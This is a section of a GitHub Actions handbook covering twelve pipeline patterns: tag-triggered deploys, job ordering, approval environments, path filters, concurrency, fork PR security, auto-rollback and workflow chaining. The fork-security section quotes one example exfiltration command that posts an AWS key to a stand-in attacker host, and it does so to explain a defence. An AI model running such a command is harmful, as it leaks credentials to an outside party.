---
title: 'Real-world pipeline patterns'
description: 'Section 12 of the GitHub Actions Handbook.'
sidebar:
  order: 12
---
Recipes are copy-paste. Patterns are how you *think*. Every real pipeline is a combination of these twelve patterns. Learn them and you'll find you never have to start a new workflow from a blank page — you'll just remix patterns you already know.

### Scenario 1 — Release tag deployment

When you create a tag, the workflow deploys.

```bash
git tag v1.0.0
git push origin v1.0.0
```

```yaml
on:
  push:
    tags:
      - 'v*'
```

Pushing `v1.0.0` triggers the deploy. Most teams use this for production — it's a clean, controlled trigger that doesn't fire on every commit.

### Scenario 2 — Sequential execution

![Scenario 2 — Sequential execution](/diagrams/scenario-02-sequential.png)

Task B only runs after Task A succeeds. Build → Test → Deploy.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest

  test:
    needs: build
    runs-on: ubuntu-latest

  deploy:
    needs: test
    runs-on: ubuntu-latest
```

Strict order. Each stage waits for the previous one to finish successfully.

### Scenario 3 — Parallel execution

![Scenario 3 — Parallel execution](/diagrams/scenario-03-parallel.png)

Multiple jobs at once. The default behavior.

```yaml
jobs:
  backend-test:
    runs-on: ubuntu-latest

  frontend-test:
    runs-on: ubuntu-latest

  api-test:
    runs-on: ubuntu-latest
```

No `needs:` anywhere, so all three run simultaneously. Faster feedback, more runner minutes burned.

### Scenario 4 — Mixed (sequential then parallel then sequential)

![Scenario 4 — Mixed (sequential then parallel then sequential)](/diagrams/scenario-04-mixed.png)

The shape of most real pipelines. Build once, fan out to parallel work, then converge on a final step.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest

  service-a:
    needs: build
    runs-on: ubuntu-latest

  service-b:
    needs: build
    runs-on: ubuntu-latest

  service-c:
    needs: build
    runs-on: ubuntu-latest

  final-check:
    needs: [service-a, service-b, service-c]
    runs-on: ubuntu-latest
```

Visually:

```
            → service-a →
build →     → service-b →     → final-check
            → service-c →
```

The final job declares all three services in its `needs:` array, so it waits for all of them.

### Scenario 5 — Microservices deployment (the real-world question)

People ask: should I deploy microservices one at a time, or in parallel?

The answer is: it depends on dependencies.

- **Case A — services are independent.** Deploy in parallel. Much faster.
- **Case B — service B depends on service A.** Sequential. Run A first, then B.

The trap is forcing everything into a chain just because it feels "safer." It's not safer, it's slower. And if your services are truly decoupled, they shouldn't need to be deployed in lockstep.

### Scenario 6 — Staged rollout (v5.1 → v5.2 → v5.3)

Controlled version rollout, also known as a canary release. Each step verifies health before the next one starts.

```
deploy v5.1 → check
deploy v5.2 → check
deploy v5.3
```

Useful when blast radius matters — rolling a new version to one tenant group at a time, for example, so you can bail out after the first group if something goes wrong.

### Scenario 7 — Environment-based deployment with approval gates

![Scenario 7 — Environment-based deployment with approval gates](/diagrams/scenario-07-environments.png)

Promote one build through dev → staging → production, with a human approval before prod.

GitHub has a feature called **Environments** (Settings → Environments). Each environment can require reviewers. When a job references that environment, the job pauses until someone clicks Approve.

```yaml
on:
  push:
    branches: [main]

jobs:
  deploy-dev:
    runs-on: ubuntu-latest
    environment: dev
    steps:
      - run: ./deploy.sh dev

  deploy-staging:
    needs: deploy-dev
    runs-on: ubuntu-latest
    environment: staging
    steps:
      - run: ./deploy.sh staging

  deploy-prod:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment: production      # configured with required reviewers
    steps:
      - run: ./deploy.sh production
```

Environments can also hold environment-scoped secrets — a different API key per stage — so your staging key can't accidentally deploy to production.

### Scenario 8 — Monorepo / path-filtered builds

In a repo holding multiple projects, you don't want changes to the docs folder triggering the full backend test suite.

```yaml
on:
  push:
    paths:
      - 'backend/**'
      - '.github/workflows/backend.yml'
  pull_request:
    paths:
      - 'backend/**'
```

This workflow only runs when files under `backend/` (or the workflow file itself) change. Pair one such workflow per project and each stays independent.

If you need finer control inside a single workflow (say, different jobs for different paths), use `dorny/paths-filter@v3`:

```yaml
jobs:
  changes:
    runs-on: ubuntu-latest
    outputs:
      backend: ${{ steps.filter.outputs.backend }}
      frontend: ${{ steps.filter.outputs.frontend }}
    steps:
      - uses: actions/checkout@v4
      - uses: dorny/paths-filter@v3
        id: filter
        with:
          filters: |
            backend: 'backend/**'
            frontend: 'frontend/**'

  backend-test:
    needs: changes
    if: needs.changes.outputs.backend == 'true'
    runs-on: ubuntu-latest
    steps: [...]
```

### Scenario 9 — Concurrency control

Two deploys racing is a classic way to break an environment. One line fixes it:

```yaml
concurrency:
  group: deploy-${{ github.ref }}
  cancel-in-progress: true

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
```

All runs that compute the same `group` string line up. With `cancel-in-progress: true`, a newer run kills the older one. For production deploys where cancelling mid-flight is dangerous, set it to `false` — newer runs wait instead.

### Scenario 10 — Fork PR security

The rule: when a contributor opens a PR from their fork, GitHub strips access to your secrets. The `GITHUB_TOKEN` is also read-only. This is deliberate — you don't want a random PR running `curl evil.com -d "$AWS_KEY"` with your credentials.

There are two related events that behave very differently:

| Event | Runs on | Has secrets? | Checks out |
|-------|---------|--------------|------------|
| `pull_request` | Forked PR code | No (external forks) | The PR branch |
| `pull_request_target` | Base branch code | Yes | The base branch by default |

The safe pattern: use `pull_request` for tests (no secrets needed). Never check out PR code inside a `pull_request_target` workflow that has secrets — that's how the nasty supply-chain incidents happen.

### Scenario 11 — Auto-rollback on health check failure

![Scenario 11 — Auto-rollback on health check failure](/diagrams/scenario-11-rollback.png)

Deploy, check if it's healthy, roll back if not.

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Capture current version
        id: prev
        run: echo "sha=$(cat current-version.txt)" >> $GITHUB_OUTPUT

      - name: Deploy new version
        run: ./deploy.sh ${{ github.sha }}

      - name: Health check
        id: health
        run: ./scripts/health-check.sh
        continue-on-error: true

      - name: Roll back if unhealthy
        if: steps.health.outcome == 'failure'
        run: ./deploy.sh ${{ steps.prev.outputs.sha }}

      - name: Fail the workflow if rolled back
        if: steps.health.outcome == 'failure'
        run: exit 1
```

The `continue-on-error: true` lets the health check "fail softly" — the workflow doesn't stop, so the rollback step can react. Using `steps.health.outcome` (not `status`) is the bit that lets us see the failure even though `continue-on-error` hid it.

### Scenario 12 — Workflow chaining with `workflow_run`

![Scenario 12 — Workflow chaining with `workflow_run`](/diagrams/scenario-12-chaining.png)

One workflow triggers another when it finishes. Useful for separating CI from CD, or decoupling slow jobs from the main pipeline.

**Workflow A (`ci.yml`)** — the test workflow:

```yaml
name: CI
on:
  push:
    branches: [main]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test
```

**Workflow B (`deploy.yml`)** — listens for A to succeed:

```yaml
name: Deploy
on:
  workflow_run:
    workflows: [CI]
    types: [completed]
    branches: [main]

jobs:
  deploy:
    if: ${{ github.event.workflow_run.conclusion == 'success' }}
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
```

Keeps test logic and deploy logic in separate files. Easier to read, safer to change.

### The combined shape

Most real production pipelines look roughly like this:

```
Trigger:
  - PR  → CI
  - Tag → Production CD

Pipeline:
  Build
     ↓
  Parallel Tests
     ↓
  Parallel Microservices Deploy
     ↓
  Final Health Check
```

And the rule of thumb:

- PR → CI.
- Tag → Release / CD.
- `needs:` → sequential.
- No `needs:` → parallel.
- Microservices → mostly parallel, unless one truly depends on another.

CI/CD design isn't really about workflows. It's about use cases and dependencies. The YAML is the easy part.

